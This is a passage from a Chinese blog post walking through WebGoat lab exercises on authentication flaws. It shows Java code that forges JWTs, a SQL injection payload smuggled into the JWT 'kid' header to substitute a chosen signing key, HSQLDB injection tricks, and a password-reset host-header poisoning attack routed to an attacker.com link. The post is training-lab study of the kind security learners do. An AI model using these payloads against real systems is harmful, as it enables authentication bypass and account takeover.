+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jtw</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] JWT_SECRET = Base64.getDecoder().decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSecretToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setIssuedAt(Calendar.getInstance().getTime())</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;kid&quot;</span>, <span class="string">&quot;webgoat_key&quot;</span>)</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>)</span><br><span class="line">                .setExpiration(Date.from(Instant.now().plusSeconds(<span class="number">6000</span>)))</span><br><span class="line">                .claim(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;false&quot;</span>)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS256, JWT_SECRET)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">secretToken</span> <span class="operator">=</span> getSecretToken();</span><br><span class="line">        System.out.println(secretToken);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、注入kid，这个就是常规方法。还是看一下主要逻辑代码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194573714.png"  alt="img"></p>
+<p>题目默认的kid是webgoat_key，因此我们如果想通过注入来指定任意key的话，可以将kid写成下面的值：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;</span>a2V5<span class="string">&#x27; from jwt_keys where id = &#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure>
+
+<p>a2V5 base64解码就是key，可以自己设置别的值。</p>
+<p>其实还试过直接注释掉，但会报错，当时是这样写的：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;</span>a2V5<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure>
+
+<p>报错为： unexpected end of statement  </p>
+<p>后面发现似乎必须有个from的操作，双横杠注释后面的空格不加也行，比如这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select &#x27;</span>a2V5<span class="string">&#x27; from jwt_keys--</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将自己的kid注入即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jtw</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_SECRET</span> <span class="operator">=</span> <span class="string">&quot;a2V5&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getSecretToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setIssuedAt(Calendar.getInstance().getTime())</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;kid&quot;</span>, <span class="string">&quot;&#x27; union select &#x27;a2V5&#x27; from jwt_keys where id = &#x27;webgoat_key&quot;</span>)</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>)</span><br><span class="line">                .setExpiration(Date.from(Instant.now().plusSeconds(<span class="number">6000</span>)))</span><br><span class="line">                .claim(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;Tom&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;false&quot;</span>)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS256, JWT_SECRET)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">secretToken</span> <span class="operator">=</span> getSecretToken();</span><br><span class="line">        System.out.println(secretToken);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里发现脚本中jwt key 都是base64编码的，跟进signWith方法，找实现类能发现里面还是会解码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194583466.png"  alt="img"></p>
+<p>这解释了为什么之前很多jwt key都是base64格式。</p>
+<p>最后更改token发包就行了：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194593083.png"  alt="img"></p>
+<h3 id="HSQLDB小知识"><a href="#HSQLDB小知识" class="headerlink" title="HSQLDB小知识"></a>HSQLDB小知识</h3><p>在注入的过程中，踩了很多坑，后面发现都是由于不清楚HSQLDB的注入性质发生的。</p>
+<p>HSQLDB在select时，必须有一个from操作，不然会报错，这个跟 PostgreSQL &#x2F; MySQL &#x2F; SQLite  不一样。</p>
+<p>一般绕过有：</p>
+<p>select 1 from (VALUES(0)) 	(VALUES(0))代表临时表，即只有一行，值为0</p>
+<p>select 1 from  INFORMATION_SCHEMA.SYSTEM_USERS </p>
+<p>这些很多文章都没说，可能默认你会了吧，但是我当时不会，导致花了很多时间。</p>
+<h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>就是让你测试一下webwolf的收邮件功能，没什么。</p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>让你找出其他用户最喜欢的颜色，这个其实是告诉我们，像这种安全问题有时候可以爆破，因为常见的颜色就那么几种。这里由于可以看源码，一下子就知道了：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194603397.png"  alt="img"></p>
+<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>这里告诉你为什么安全问题很难设置，列举了许多安全问题和其缺点，任意阅读两个即可。（怪不得现在基本看不见这种验证方式了，确实有很多问题，小时候设置的安全问题现在全忘了）</p>
+<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>这题是修改邮箱中重置密码的链接。先来解释一下原理。</p>
+<p>正常情况下，重置密码的链接是发到自己邮箱里的，比如这一题填<a class="link"   href="mailto:&#119;&#x65;&#98;&#103;&#x6f;&#x61;&#x74;&#64;&#119;&#101;&#x62;&#103;&#111;&#x61;&#x74;&#x2e;&#111;&#x72;&#x67;" >webgoat@webgoat.org<i class="fas fa-external-link-alt"></i></a>，就会把邮件发到webwolf对应的邮箱里：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194610332.png"  alt="img"><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194610347.png"  alt="img"></p>
+<p>然后点击这里的link就会进入重置密码页面（当然这里不会真的重置你的靶场登录密码）。</p>
+<p>这里的link是：<a class="link"   target="_blank" rel="noopener" href="http://localhost:8085/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364" >http://localhost:8085/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364<i class="fas fa-external-link-alt"></i></a></p>
+<p>当我们将重置邮箱填<a class="link"   href="mailto:&#x74;&#x6f;&#x6d;&#64;&#119;&#101;&#x62;&#103;&#111;&#x61;&#x74;&#x2d;&#x63;&#x6c;&#111;&#117;&#100;&#x2e;&#x6f;&#x72;&#x67;" >tom@webgoat-cloud.org<i class="fas fa-external-link-alt"></i></a>时，重置邮件会发送给tom，其link应该也是上面这种形式。但是如果攻击者对link里的host可控，就会造成这样的情况，link被修改为：<a class="link"   target="_blank" rel="noopener" href="http://localhost:8085/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364" >http://www.attacker.com/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364<i class="fas fa-external-link-alt"></i></a></p>
+<p>那么就会对攻击者的服务器发送一个重置请求。这样一来，受害者tom应该会看到浏览器什么都没打开，但是攻击者却受到了tom的重置link，即：<a class="link"   target="_blank" rel="noopener" href="http://localhost:8085/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364" >http://www.attacker.com/WebGoat/PasswordReset/reset/reset-password/8b53dd29-bdd6-40f4-8a75-196d568d7364<i class="fas fa-external-link-alt"></i></a></p>
+<p>这样一来，攻击者只需要修改前面的host为官方地址就可以重置tom的密码了。</p>
+<p>接下来看代码，我们发送重置密码后具体处理逻辑如下：</p>
+<p><img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194618853.png"  alt="img"></p>
+<p>我们这里要进入上面那个if，所以需要手动更改host为webwolf的：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194618869.png"  alt="img"></p>
+<p>这样进入if后，就会往userToTomResetLink中放入键值对。然后在fakeClickingLinkEmail方法里，会模拟受害者点击邮箱中的密码重置链接。这里的密码重置链接就会被我们的webwolf收到：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194618882.png"  alt="img"></p>
+<p>于是我们就能得到tom的密码重置链接，接下来就很简单了。</p>
+<p>一开始没弄懂原理，直接看源码，从成功条件反推的。也是发现这里的密码重置链接并不会用一次就失效，而是可以一直用，不过如果没把Host改成webwolf就是假修改，不会生效。因为下面这个代码：<img   src="/2025/05/03/JNI/oat%E9%9D%B6%E5%9C%BA-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7/image-1753194626482.png"  alt="img"></p>
+<p>必须进入这个if才能真正修改，而这个if对应的checkIfLinkIsFromTom中的userToTomResetLink，只有在前面Host为webwolf的时候才会添加。</p>
+<p>另外，userToTomResetLink始终只存在一个键值对，因为用的是put方法。而resetLinks会随着请求而一直增加，因为用的是add方法。当时迷惑为什么前者每次都会重置，明明两个都是static变量。这也算是模拟真正的重置链接只能用一次。</p>
+<h1 id="安全的密码"><a href="#安全的密码" class="headerlink" title="安全的密码"></a>安全的密码</h1><p>这里就是告诉你要设置强密码，没什么好说的。</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>之前对JWT是一知半解，这次学习后算是清楚一点了，主要是做了很多实操，尤其是jku和kid。同时对HSQL的注入也有了初步认识。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/04/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-04-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7(%E4%B8%8A)/#5-JWT-Tokens-PageLesson10-Refresh-a-token" >https://drun1baby.top/2022/04/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-04-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7(%E4%B8%8A)/#5-JWT-Tokens-PageLesson10-Refresh-a-token<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                WebGoat靶场-身份认证缺陷
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/07/22/WebGoat靶场-身份认证缺陷/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-07-22 22:20</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/07/11/Javassist%E5%88%9D%E8%A7%81/"
+                                   title="Javassist初见"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Javassist初见</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">二因素认证绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E4%BC%A0%E8%BE%93"><span class="nav-number">3.</span> <span class="nav-text">明文传输</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JWT"><span class="nav-number">4.</span> <span class="nav-text">JWT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#jwt%E8%A7%A3%E7%A0%81"><span class="nav-number">4.1.</span> <span class="nav-text">jwt解码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E7%AD%BE%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">4.2.</span> <span class="nav-text">空签名绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jwt%E5%AF%86%E9%92%A5%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">4.3.</span> <span class="nav-text">jwt密钥暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%9C%9Ftoken%E9%87%8D%E6%94%BE"><span class="nav-number">4.4.</span> <span class="nav-text">过期token重放</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jku%E4%BC%AA%E9%80%A0"><span class="nav-number">4.5.</span> <span class="nav-text">jku伪造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kid%E6%B3%A8%E5%85%A5"><span class="nav-number">4.6.</span> <span class="nav-text">kid注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HSQLDB%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="nav-number">4.6.1.</span> <span class="nav-text">HSQLDB小知识</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">密码重置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">5.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">5.2.</span> <span class="nav-text">第二题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="nav-number">5.3.</span> <span class="nav-text">第三题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="nav-number">5.4.</span> <span class="nav-text">第四题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">6.</span> <span class="nav-text">安全的密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">30.9k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">二因素认证绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E4%BC%A0%E8%BE%93"><span class="nav-number">3.</span> <span class="nav-text">明文传输</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JWT"><span class="nav-number">4.</span> <span class="nav-text">JWT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#jwt%E8%A7%A3%E7%A0%81"><span class="nav-number">4.1.</span> <span class="nav-text">jwt解码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A9%BA%E7%AD%BE%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">4.2.</span> <span class="nav-text">空签名绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jwt%E5%AF%86%E9%92%A5%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">4.3.</span> <span class="nav-text">jwt密钥暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%9C%9Ftoken%E9%87%8D%E6%94%BE"><span class="nav-number">4.4.</span> <span class="nav-text">过期token重放</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jku%E4%BC%AA%E9%80%A0"><span class="nav-number">4.5.</span> <span class="nav-text">jku伪造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kid%E6%B3%A8%E5%85%A5"><span class="nav-number">4.6.</span> <span class="nav-text">kid注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HSQLDB%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="nav-number">4.6.1.</span> <span class="nav-text">HSQLDB小知识</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">密码重置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">5.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">5.2.</span> <span class="nav-text">第二题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="nav-number">5.3.</span> <span class="nav-text">第三题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="nav-number">5.4.</span> <span class="nav-text">第四题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">6.</span> <span class="nav-text">安全的密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
